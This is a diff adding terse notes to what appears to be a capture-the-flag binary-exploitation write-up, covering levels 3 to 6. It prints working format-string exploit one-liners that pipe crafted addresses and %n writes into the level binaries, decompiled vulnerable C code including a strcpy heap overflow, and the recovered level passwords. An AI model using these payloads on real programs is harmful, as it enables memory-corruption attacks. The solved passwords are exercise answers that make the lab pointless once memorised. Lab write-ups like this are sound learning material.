@@ -185,14 +185,86 @@ void main(void)
 ```
 
 Address of m: `0x0804988c`
-
+              `\x8c\x98\x04\x08`
 [Exploit 101 - Format Strings - BreakInSecurity](https://axcheron.github.io/exploit-101-format-strings/)
+
+./level3 
+AAAA %x %x %x %x %x %x %x %x %x %x 
+AAAA 200 b7fd1ac0 b7ff37d0 `41414141` 20782520 25207825 78252078 20782520 25207825 78252078 
+                            ^ AAAA
+
+python -c "print '\x8c\x98\x04\x08'+'%x %x %x %x'" | ./level3
+�200 b7fd1ac0 b7ff37d0 `804988c`
+
+(python -c 'print "\x8c\x98\x04\x08" + ("A" * 60) + "%4$n"' ; cat) | ./level3
+
+`b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
 
 # level4
 
+12 = offset %x %x %x....
+
+python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"'| ./level4
+
+```c
+void n(void)
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  p(local_20c);
+  if (m == 16930116) {
+    system("/bin/cat /home/user/level5/.pass");
+  }
+  return;
+}
+
+void main(void)
+{
+  n();
+  return;
+}
+
+```
+
+`0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
+
 # level5
+o = 080484a4 -> 134513828
+exit = *0x8049838
+
+python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' | ./level5
+                                        ^^^^^^^^^ o - 4
+`d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
 
 # level6
+
+```c
+void n(void) // 08048454
+{
+  system("/bin/cat /home/user/level7/.pass");
+  return;
+}
+
+void m(void *param_1,int param_2,char *param_3,int param_4,int param_5) // 08048468
+{
+  puts("Nope");
+  return;
+}
+
+void main(int argc,char **argv)
+{
+  char *vuln;
+  void **func;
+  
+  vuln = (char *)malloc(64);
+  func = (void **)malloc(4);
+  *func = m;
+  strcpy(vuln, argv[1]);
+  (**func)();
+  return;
+}
+```
 
 # level7
 
